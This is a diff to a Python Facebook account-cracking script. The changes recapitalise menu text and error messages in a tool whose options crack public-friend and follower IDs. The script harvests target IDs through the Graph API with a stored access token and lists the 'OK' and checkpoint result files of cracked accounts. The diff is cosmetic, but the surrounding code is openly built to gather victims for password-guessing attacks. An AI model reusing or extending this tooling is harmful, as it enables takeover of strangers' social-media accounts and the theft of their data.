@@ -133,11 +133,11 @@ def menu():
         print("\033[1;96m\033[1;92m<>\033[1;96m\033[1;92m \033[1;97mNama       : \033[1;93m"+nama+"\033[1;92m")
         print("\033[1;96m\033[1;92m<>\033[1;96m\033[1;92m \033[1;97mIp User    : \033[1;93m%s"%(ip))
         print("\033[1;96m\033[1;91m⋆✥⋆➣\033[1;96m\033[1;92m \033[1;96m==================================================\n")
-	print("\033[1;96m[\033[1;93m1\033[1;96m] \033[1;92m⋆✥⋆➣\033[1;97m Clone from public friends")
-	print("\033[1;96m[\033[1;93m2\033[1;96m] \033[1;92m⋆✥⋆➣\033[1;97m Crack from public followers")
+	print("\033[1;96m[\033[1;93m1\033[1;96m] \033[1;92m⋆✥⋆➣\033[1;97m Crack Id Public + Friends")
+	print("\033[1;96m[\033[1;93m2\033[1;96m] \033[1;92m⋆✥⋆➣\033[1;97m Crack Id Followers")
 	print("\033[1;96m[\033[1;93m3\033[1;96m] \033[1;92m⋆✥⋆➣\033[1;97m Multi cracking from public Id\033[1;97m [ \033[1;95mPro \033[1;97m]")
-	print("\033[1;96m[\033[1;93m4\033[1;96m] \033[1;92m⋆✥⋆➣\033[1;97m Check crack results")
-	print("\033[1;96m[\033[1;93m5\033[1;96m] \033[1;92m⋆✥⋆➣\033[1;97m User-agent settings \033[1;97m [ \033[1;95mPro \033[1;97m]")
+	print("\033[1;96m[\033[1;93m4\033[1;96m] \033[1;92m⋆✥⋆➣\033[1;97m Check Crack Results")
+	print("\033[1;96m[\033[1;93m5\033[1;96m] \033[1;92m⋆✥⋆➣\033[1;97m User-Agent Settings \033[1;97m [ \033[1;95mPro \033[1;97m]")
 	print("\033[1;96m[\033[1;93m6\033[1;96m] \033[1;92m⋆✥⋆➣\033[1;91m Remove-Token")
 	print("\033[1;96m[\033[1;93m0\033[1;96m] \033[1;92m⋆✥⋆➣\033[1;97m Exit\n")		
 	Bilal = raw_input("\033[1;96m[\033[1;93m•\033[1;96m] \033[1;92m⋆✥⋆➣\033[1;97m Option : \033[1;92m")
@@ -154,8 +154,8 @@ def menu():
 		method()
 	elif Bilal == "4" or Bilal == "04":
 		print(" ")
-		print("\033[1;96m[\033[1;93m1\033[1;96m] \033[1;92m⋆✥⋆➣\033[1;97m Check results RAKA_AMANDA OK")
-		print("\033[1;96m[\033[1;93m2\033[1;96m] \033[1;92m⋆✥⋆➣\033[1;97m Check results RAKA_AMANDA CP")
+		print("\033[1;96m[\033[1;93m1\033[1;96m] \033[1;92m⋆✥⋆➣\033[1;97m Check Results RAKA_AMANDA OK")
+		print("\033[1;96m[\033[1;93m2\033[1;96m] \033[1;92m⋆✥⋆➣\033[1;97m Check Results RAKA_AMANDA CP")
 		print(" ")
         elif Bilal == "6" or Bilal == "06":
                 jalan('\033[1;97m[\033[1;92m•\033[1;97m] Delete Token....');time.sleep(1)
@@ -169,11 +169,11 @@ def menu():
 			menu()
 		elif cek == "1":
 			dirs = os.listdir("OK")
-			print("\033[1;96m[\033[1;93m•\033[1;96m] Copy file name  and past into input")
+			print("\033[1;96m[\033[1;93m•\033[1;96m] Copy File Name  And Past Into Input")
 			for file in dirs:
 				print("[®]  "+file)
 			try:
-				file = raw_input("\n\033[1;96m[\033[1;93m•\033[1;96m] file name : ")
+				file = raw_input("\n\033[1;96m[\033[1;93m•\033[1;96m] File Name : ")
 				if file == "":
 					menu()
 				Totalok = open("OK/%s"%(file)).read().splitlines()
@@ -220,7 +220,7 @@ def publik():
 			nama = i["name"].rsplit(" ")[0]
 			id.append(uid+"<=>"+nama)
 	except KeyError:
-		exit("\033[1;93m◍➤\033[1;97m Account friend list is not public")
+		exit("\033[1;93m◍➤\033[1;97m Account Friend List Is Not Public")
 	print("[\033[1;93m•\033[1;97m] Total Id        : \033[0;91m%s\033[0;97m"%(len(id))) 
 
 def follower():
@@ -228,7 +228,7 @@ def follower():
 	try:
 		token = open("login.txt", "r").read()
 	except IOError:
-		exit("\n\033[1;96m[\033[1;94m•\033[1;96m] Token Error")
+		exit("\n\033[1;97m[\033[1;92m•\033[1;97m] \033[1;91mToken Expired\033[1;97m")
 	idt = raw_input("[\033[1;93m•\033[1;97m] Target Id       : \033[1;92m")
 	try:
 		for i in requests.get("https://graph.facebook.com/%s/subscribers?limit=5000&access_token=%s"%(idt, token)).json()["data"]:
@@ -236,7 +236,7 @@ def follower():
 			nama = i["name"].rsplit(" ")[0]
 			id.append(uid+"<=>"+nama)
 	except KeyError:
-		exit("\033[1;93m◍➤\033[1;97m Account friend list is not public")
+		exit("\033[1;93m◍➤\033[1;97m Account Friend List Is Not Public")
 	print("[\033[1;93m•\033[1;97m] Total Id        : \033[0;91m%s\033[0;97m"%(len(id))) 
 
 def massal():
@@ -244,7 +244,7 @@ def massal():
 	try:
 		token = open("login.txt", "r").read()
 	except IOError:
-		exit("\033[1;96m[\033[1;94m•\033[1;96m] Token Error")
+		exit("\033[1;97m[\033[1;92m•\033[1;97m] \033[1;91mToken Expired\033[1;97m")
 	try:
 		tanya_Total = int(input("\033[1;93m◍➤\033[1;97m Enter Multiple ID Option : "))
 	except:tanya_Total=1
@@ -257,11 +257,11 @@ def massal():
 				nama = n["name"].rsplit(" ")[0]
 				id.append(uid+"<=>"+nama)
 		except KeyError:
-			print("\033[1;93m◍➤\033[1;97m  Ids friend list Is not public")
+			print("\033[1;93m◍➤\033[1;97m Account Friend List Is Not Public")
 	print("[\033[1;93m•\033[1;97m] Total id    : \033[0;92m%s\033[0;96m"%(len(id)))
 
 def method():
-	print("[\033[1;93m•\033[1;97m] Choose crack methode [ \033[1;92mRecommended B-API \033[1;97m]")
+	print("[\033[1;93m•\033[1;97m] Choose Crack Methode [ \033[1;92mRecommended M-Basic \033[1;97m]")
 	print("\033[1;96m[\033[1;93m1\033[1;96m] \033[1;92m⋆✥⋆➣ \033[1;97mB-API\033[1;97m [ \033[1;95mFast \033[1;97m]")
 	print("\033[1;96m[\033[1;93m2\033[1;96m] \033[1;92m⋆✥⋆➣ \033[1;97mM-Basic\033[1;97m [ \033[1;95mFast \033[1;97m]")
 	print("\033[1;96m[\033[1;93m3\033[1;96m] \033[1;92m⋆✥⋆➣ \033[1;97mFree Facebook\033[1;97m [ \033[1;95mNormal \033[1;97m]\n")
